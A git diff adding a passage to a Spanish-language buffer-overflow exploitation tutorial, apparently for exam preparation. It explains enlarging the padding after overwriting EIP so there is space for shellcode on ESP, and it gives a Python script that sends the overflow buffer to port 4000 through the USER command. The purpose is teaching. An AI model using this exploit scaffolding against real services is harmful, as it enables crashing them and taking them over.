@@ -208,6 +208,47 @@ El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (
 
 Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.
 
+-   Situando y Asignando Espacio al Shellcode
 
+A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 317 bytes aproximadamente desde **msfvenom**.
+
+La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo así), si vemos que el registro **EIP** ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.
+
+Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.
+
+Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:
+
+```python
+#!/usr/bin/python
+# coding: utf-8
+
+import sys,socket
+
+if len(sys.argv) != 2:
+  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  sys.exit(0)
+
+buffer = "A"*809 + "B"*4 + "C"*(1300-809-4)
+
+ipAddress = sys.argv[1]
+
+port = 4000
+
+try:
+  print "Enviando búffer..."
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((ipAddress, port))
+  s.recv(1024)
+  s.send("USER " + buffer + '\r\n')
+  s.recv(1024)
+  s.close()
+except:
+  print "\nError de conexión...\n"
+  sys.exit(0)
+
+```
+En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serán situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.
+
+-   Detectando los Badchars
 
 
